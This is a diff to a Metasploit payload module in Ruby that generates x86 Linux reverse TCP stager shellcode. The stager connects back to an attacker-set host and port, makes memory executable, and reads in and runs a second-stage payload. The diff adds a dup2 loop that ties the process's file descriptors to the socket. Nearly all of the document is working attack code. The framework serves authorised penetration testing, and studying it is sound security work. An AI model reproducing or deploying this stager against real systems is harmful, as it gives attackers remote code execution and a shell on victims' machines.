@@ -1,126 +1,122 @@
 # -*- coding: binary -*-
 
 module Msf
-
-###
-#
-# Complex reverse TCP payload generation for Linux ARCH_X86
-#
-###
-
-
-module Payload::Linux::ReverseTcp_x86
-
-  include Msf::Payload::TransportConfig
-  include Msf::Payload::Linux
-  include Msf::Payload::Linux::SendUUID
-  include Msf::Payload::Linux::SendMagic
-  
-
+  ###
   #
-  # Generate the first stage
+  # Complex reverse TCP payload generation for Linux ARCH_X86
   #
-  def generate(_opts = {})
-    conf = {
-      port:          datastore['LPORT'],
-      host:          datastore['LHOST'],
-      ihost:         datastore['IHOST'],
-      iport:         datastore['IPORT'],
-      iv:            datastore['IV'],
-      key:           datastore['KEY'],
-      retry_count:   datastore['StagerRetryCount'],
-      sleep_seconds: datastore['StagerRetryWait'],
-    }
+  ###
 
-    # Generate the advanced stager if we have space
-    if self.available_space && required_space <= self.available_space
-      conf[:exitfunk] = datastore['EXITFUNC']
-    end
+  module Payload::Linux::ReverseTcpX86
+    include Msf::Payload::TransportConfig
+    include Msf::Payload::Linux
+    include Msf::Payload::Linux::SendUUID
+    include Msf::Payload::Linux::SendMagic
 
-    generate_reverse_tcp(conf)
-  end
+    #
+    # Generate the first stage
+    #
+    def generate(_opts = {})
+      conf = {
+        port: datastore['LPORT'],
+        host: datastore['LHOST'],
+        ihost: datastore['IHOST'],
+        iport: datastore['IPORT'],
+        iv: datastore['IV'],
+        key: datastore['KEY'],
+        retry_count: datastore['StagerRetryCount'],
+        sleep_seconds: datastore['StagerRetryWait']
+      }
 
-  #
-  # By default, we don't want to send the UUID, but we'll send
-  # for certain payloads if requested.
-  #
-  def include_send_uuid
-    false
-  end
-
-  def include_send_magic
-    false
-  end
-
-  def transport_config(opts={})
-    transport_config_reverse_tcp(opts)
-  end
-
-  #
-  # Generate and compile the stager
-  #
-  def generate_reverse_tcp(opts={})
-    asm = asm_reverse_tcp(opts)
-    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
-  end
-
-  #
-  # Determine the maximum amount of space required for the features requested
-  #
-  def required_space
-    # Start with our cached default generated size
-    space = 300
-
-    # Reliability adds 10 bytes for recv error checks
-    space += 10
-
-    # The final estimated size
-    space
-  end
-
-  #
-  # Generate an assembly stub with the configured feature set and options.
-  #
-  # @option opts [Integer] :port The port to connect to
-  # @option opts [String] :host The host IP to connect to
-  #
-  def asm_reverse_tcp(opts={})
-    # TODO: reliability is coming
-    retry_count  = opts[:retry_count]
-    encoded_port = "0x%.8x" % [opts[:port].to_i, 2].pack("vn").unpack("N").first
-    encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
-    seconds = (opts[:sleep_seconds] || 5.0)
-    sleep_seconds = seconds.to_i
-    sleep_nanoseconds = (seconds % 1 * 1000000000).to_i
-
-    mprotect_flags = 0b111 # PROT_READ | PROT_WRITE | PROT_EXEC
-
-    if respond_to?(:generate_intermediate_stage)
-      pay_mod = framework.payloads.create(self.refname)
-      read_length = pay_mod.generate_intermediate_stage(pay_mod.generate_stage(datastore.to_h)).size
-    elsif !module_info['Stage']['Payload'].empty?
-      read_length = module_info['Stage']['Payload'].size
-    else
-      # If we don't know, at least use small instructions
-      read_length = 0x0c00 + mprotect_flags
-    end
-
-    # I was bored on the train, ok?
-    read_reg =
-      if read_length % 0x100 == mprotect_flags && read_length <= 0xff00 + mprotect_flags
-        # We use `edx` as part mprotect, but at two bytes assembled, this edge case is worth checking:
-        # If the lower byte will be the same, just set the upper byte
-        read_length = read_length / 0x100
-        'dh'
-      elsif read_length < 0x100
-        'dl' # Also assembles in two bytes ^.^
-      elsif read_length < 0x10000
-        'dx' # Shave a byte off of setting `edx`
-      else
-        'edx' # Take five bytes :/
+      # Generate the advanced stager if we have space
+      if available_space && required_space <= available_space
+        conf[:exitfunk] = datastore['EXITFUNC']
       end
 
-    asm = %Q^
+      generate_reverse_tcp(conf)
+    end
+
+    #
+    # By default, we don't want to send the UUID, but we'll send
+    # for certain payloads if requested.
+    #
+    def include_send_uuid
+      false
+    end
+
+    def include_send_magic
+      false
+    end
+
+    def transport_config(opts = {})
+      transport_config_reverse_tcp(opts)
+    end
+
+    #
+    # Generate and compile the stager
+    #
+    def generate_reverse_tcp(opts = {})
+      asm = asm_reverse_tcp(opts)
+      Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
+    end
+
+    #
+    # Determine the maximum amount of space required for the features requested
+    #
+    def required_space
+      # Start with our cached default generated size
+      space = 300
+
+      # Reliability adds 10 bytes for recv error checks
+      space += 10
+
+      # The final estimated size
+      space
+    end
+
+    #
+    # Generate an assembly stub with the configured feature set and options.
+    #
+    # @option opts [Integer] :port The port to connect to
+    # @option opts [String] :host The host IP to connect to
+    #
+    def asm_reverse_tcp(opts = {})
+      # TODO: reliability is coming
+      retry_count = opts[:retry_count]
+      encoded_port = '0x%.8x' % [opts[:port].to_i, 2].pack('vn').unpack('N').first
+      encoded_host = '0x%.8x' % Rex::Socket.addr_aton(opts[:host] || '127.127.127.127').unpack('V').first
+      seconds = (opts[:sleep_seconds] || 5.0)
+      sleep_seconds = seconds.to_i
+      sleep_nanoseconds = (seconds % 1 * 1000000000).to_i
+
+      mprotect_flags = 0b111 # PROT_READ | PROT_WRITE | PROT_EXEC
+
+      if respond_to?(:generate_intermediate_stage)
+        pay_mod = framework.payloads.create(refname)
+        read_length = pay_mod.generate_intermediate_stage(pay_mod.generate_stage(datastore.to_h)).size
+      elsif !module_info['Stage']['Payload'].empty?
+        read_length = module_info['Stage']['Payload'].size
+      else
+        # If we don't know, at least use small instructions
+        read_length = 0x0c00 + mprotect_flags
+      end
+
+      # I was bored on the train, ok?
+      read_reg =
+        if read_length % 0x100 == mprotect_flags && read_length <= 0xff00 + mprotect_flags
+          # We use `edx` as part mprotect, but at two bytes assembled, this edge case is worth checking:
+          # If the lower byte will be the same, just set the upper byte
+          read_length /= 0x100
+          'dh'
+        elsif read_length < 0x100
+          'dl' # Also assembles in two bytes ^.^
+        elsif read_length < 0x10000
+          'dx' # Shave a byte off of setting `edx`
+        else
+          'edx' # Take five bytes :/
+        end
+
+      asm = %^
         push #{retry_count}        ; retry counter
         pop esi
       create_socket:
@@ -151,6 +147,19 @@ module Payload::Linux::ReverseTcp_x86
         inc ebx
         int 0x80                   ; sys_socketcall (connect())
         test eax, eax
+        push 0x2
+        pop ecx
+        
+      dup_loop:
+        mov al,0x3f
+        int 0x80
+        dec ecx
+        jns dup_loop
+    ^
+      asm << asm_send_magic(opts) if ( include_send_magic && !opts[:ihost].nil? && !opts[:iport].nil? && !opts[:iv].nil? && !opts[:key].nil? ) 
+
+      asm << %^
+        test eax, eax
         jns mprotect
 
       handle_failure:
@@ -168,9 +177,9 @@ module Payload::Linux::ReverseTcp_x86
         jmp failed
     ^
 
-    asm << asm_send_uuid if include_send_uuid
+      asm << asm_send_uuid if include_send_uuid
 
-    asm << %Q^
+      asm << %^
       mprotect:
         mov dl, 0x#{mprotect_flags.to_s(16)}
         mov ecx, 0x1000
@@ -181,11 +190,7 @@ module Payload::Linux::ReverseTcp_x86
         int 0x80                  ; sys_mprotect
         test eax, eax
         js failed
-    ^
 
-    asm << asm_send_magic(opts) if include_send_magic
-
-    asm << %Q^
       recv:
         pop ebx
         mov ecx, esp
@@ -203,9 +208,7 @@ module Payload::Linux::ReverseTcp_x86
         int 0x80                  ; sys_exit
     ^
 
-    asm
+      asm
+    end
   end
-
-end
-
 end
